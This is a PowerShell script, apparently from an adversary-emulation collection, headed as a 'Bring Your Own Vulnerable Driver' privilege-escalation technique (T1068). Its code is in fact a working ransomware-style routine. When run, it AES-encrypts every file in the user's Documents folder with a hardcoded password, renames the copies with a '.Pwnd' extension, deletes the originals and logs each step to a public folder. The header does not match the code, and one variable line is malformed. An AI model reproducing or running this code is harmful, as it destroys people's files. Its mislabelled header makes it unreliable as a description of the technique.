# Bring Your Own Vulnerable Driver
# Technic ID : T1068
Clear-Host
Write-Output "==============================================================================="
Write-Output " Exploitation for Privilege Exploitation (T1068)"
Write-Output "==============================================================================="
################ [ GLOBAL VARIABLES ] ################
$PathToManage = "$env:USERPROFILE\Documents";
$FilesMgmt = "$env:PUBLIC\exf\Vuln_Drivers.txt";
$EncryptionKey = "Encrypt!on-K3y"
$NewExtension = "Pwnd"
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$DriversList ""
################ [ FUNCTIONS ] ################

# Function to encrypt a file in AES
function EncryptFileAES {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InputFile,
        [Parameter(Mandatory = $true)]
        [string]$OutputFile,
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,
        [Parameter(Mandatory = $true)]
        [byte[]]$IVParameter
    )
    
    try {
        # Create AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $IVParameter

        # Create Encryptor
        $encryptor = $aes.CreateEncryptor()
        
        # Read Source file
        $inputBytes = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Encrypt File content
        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
        
        # Write encrypted file (IV + encrypted data)
        $outputBytes = $IVParameter + $encryptedBytes
        [System.IO.File]::WriteAllBytes($OutputFile, $outputBytes)
        
        # Cleanup process
        $encryptor.Dispose()
        $aes.Dispose()
        
        Write-output "Successfully Encrypted File : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        return $true
    }
    catch {
        Write-output "Encryption failure for file : $InputFile error code : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        return $false
    }
}

# Fucntion to create a key from a password
function GetKeyFromPassword {
    param(
        [Parameter(Mandatory = $true)]
        [String]$Password,
        [byte[]]$Salt = @(0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76),    
        [int]$Iterations = 10000
    )
    
    $rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, $Iterations)
    return $rfc2898.GetBytes(32) # 256 bits pour AES-256
}

# Function to encrypt files in a directory.
function EncryptFiles {
    param(
        [string]$DirectoryPath = $PathToManage,
        [string]$Password = $EncryptionKey,
        [string]$FileFilter = "*.*",
        [switch]$Recursive,
        [switch]$DeleteOriginal,
        [string]$OutputSuffix = "." + $NewExtension
    )
    
    # Check that directory exists
    if (-not (Test-Path $DirectoryPath)) {
        Write-output "Directory :  '$DirectoryPath' does not exist or can not be accessed." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        return
    }
    
    # Compute key from provided password.
    Write-output "Computing encryption key from Password ..." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
    $key = GetKeyFromPassword -Password $Password
    Write-output "Key      : $key" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
    Write-output "Password : $Password" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
    # Retrieve list of files in the mentioned directory.
    $searchOption = if ($Recursive) { "AllDirectories" } else { "TopDirectoryOnly" }
    
    try {
        $files = Get-ChildItem -Path $DirectoryPath -Filter $FileFilter -File -Recurse:$Recursive
        
        if ($files.Count -eq 0) {
            Write-output "No file has been found with the selected extension : '$FileFilter' in directory : '$DirectoryPath'" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
            return
        }
        
        Write-output "Number of files to encrypt : $($files.Count)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        
        $successCount = 0
        $errorCount = 0
        
        foreach ($file in $files) {
            # Ignore already encrypted files.
            if ($file.Name.EndsWith($OutputSuffix)) {
                Write-output "File $($file.Name) is already encrypted." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                continue
            }
            
            # Compute an IV for each file
            $aes = [System.Security.Cryptography.Aes]::Create()
            $IvAES = $aes.IV
            $aes.Dispose()
            
            # Defines output file name.
            $outputFile = $file.FullName + $OutputSuffix
            # Encrypt File
            if (EncryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key -IVParameter $IvAES) {
                $successCount++
                $FileCheckSum = Get-FileHash -Path $file.FullName -Algorithm SHA256
                Write-output "`n"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                Write-output "Original filename             : $file.FullName"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append    
                Write-output "Original File SHA256 checksum : $($FileCheckSum.Hash)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append    
                Write-output "Encrypted Filename            : $outputFile"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append  

                # Remove orignal file if mentioned.
                if ($DeleteOriginal) {
                    try {
                        Remove-Item $file.FullName -Force
                        Write-output "  ---> Original file : $file.FullName has been deleted."  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                    }
                    catch {
                        Write-output "Unable to delete orignal file?=. Error :  $($_.Exception.Message)"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                    }
                }
            }
            else {
                $errorCount++
            }
        }
        
        Write-output "`n"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        Write-output "Number of files encrypted                                  : $successCount" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        Write-output "Number of Errors encountered during the encryption process : $errorCount" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        
    }
    catch {
        Write-output "Error occured during directory management : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
    }
}

# Function to decrypt a file.
function DecryptFileAES {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InputFile,
        
        [Parameter(Mandatory = $true)]
        [string]$OutputFile,
        
        [Parameter(Mandatory = $true)]
        [byte[]]$Key
    )
    
    try {
        # Read encrypted file
        $encryptedData = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Extract IV (16 first bytes)
        $iv = $encryptedData[0..15]
        $cipherText = $encryptedData[16..($encryptedData.Length - 1)]
        
        # Compute AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $iv
        
        # Decrytpor creation
        $decryptor = $aes.CreateDecryptor()
        
        # Decrypt data
        $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
        
        # Write decrypted file
        [System.IO.File]::WriteAllBytes($OutputFile, $decryptedBytes)
        
        # Cleanup
        $decryptor.Dispose()
        $aes.Dispose()
        
        Write-output "Decrypted file : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        return $true
    }
    catch {
        Write-output "Error while decrypting file $InputFile : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
        return $false
    }
}

# Function to decrypt files in a directory
function DecryptFiles {
    param(
        # [Parameter(Mandatory=$true)]
        [string]$DirectoryPath = $PathToManage,
        
        #[Parameter(Mandatory=$true)]
        [string]$Password = $EncryptionKey,
        $MatchEndingExtension = "\." + $NewExtension + "$",       
        [string]$EncryptedSuffix = "." + $NewExtension,
        
        [switch]$Recursive,
        
        [switch]$DeleteEncrypted
    )
    
    $key = GetKeyFromPassword -Password $Password
    $files = Get-ChildItem -Path $DirectoryPath -Filter "*$EncryptedSuffix" -File -Recurse:$Recursive
    
    foreach ($file in $files) {
        
        $outputFile = $file.FullName -replace $MatchEndingExtension, ''

        
        if (DecryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key) {
            if ($DeleteEncrypted) {
                Remove-Item $file.FullName -Force
                Write-output "     Encrypted file "$file.FullName" has been deleted" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
            }
        }
    }
}

################ [ MAIN BODY ] ################
Write-output "-------------------------------------"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Force
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $FilesMgmt -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
EncryptFiles -DeleteOriginal

################ [ EXAMPLES ] ################

# Encrypt all .txt files in mentioned directory
#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.txt" -Password "MyPassw0rd23!"

# Encrypt all .txt files in mentioned directory and remove orginal files
#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.pdf" -DeleteOriginal

# Encrypt recursively all .txt files in mentioned directory and remove orginal files 
#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.pdf" -DeleteOriginal -Recursive

#Decrypt encrypted files commands sames parameters as previous commands.
# DecryptFiles -DirectoryPath "C:\xxxx" -Recursive 
# DecryptFiles -DirectoryPath "C:\xxxx" -Recursive -DeleteEncrypted

# if no parameters are passed the defined password and directory are defined at the beginning of this script.